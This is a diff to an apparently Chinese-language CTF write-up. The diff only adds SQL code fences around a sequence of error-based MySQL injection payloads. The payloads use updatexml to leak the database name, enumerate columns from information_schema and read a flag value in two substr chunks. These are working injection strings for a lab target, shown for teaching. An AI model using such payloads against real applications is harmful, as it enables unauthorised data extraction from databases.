@@ -46,7 +46,9 @@
 
 先用updatexml进行测试
 
+```sql
 1' and (updatexml(1,0x7e,1))#
+```
 
 ![image-20251127112650547](image-20251127112650547.png)
 
@@ -54,7 +56,9 @@
 
 所以我们可以利用这个方式得到flag
 
+```sql
 1' and updatexml(1,concat(0x7e,database(),0x7e),1) #
+```
 
 ![image-20251127112759284](image-20251127112759284.png)
 
@@ -62,11 +66,15 @@
 
 ![image-20251127112850586](image-20251127112850586.png)
 
+```sql
 1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'),0x7e),1) #
+```
 
 ![image-20251127112947628](image-20251127112947628.png)
 
+```sql
 1' and updatexml(1,concat(0x7e,(select group_concat(flag_value)from flag),0x7e),1) #
+```
 
 ![image-20251129155755769](image-20251129155755769.png)
 
@@ -74,11 +82,15 @@
 
 所以需要用到substr函数来分开读取两部分的flag
 
+```sql
 1' and updatexml(1,concat(0x7e,(select substr(flag_value,1,32) from flag limit 0,1),0x7e),1) #
+```
 
 ![image-20251129160324313](image-20251129160324313.png)
 
+```sql
 1' and updatexml(1,concat(0x7e,(select substr(flag_value,33,32) from flag limit 0,1),0x7e),1) #
+```
 
 ![image-20251129160357643](image-20251129160357643.png)
 
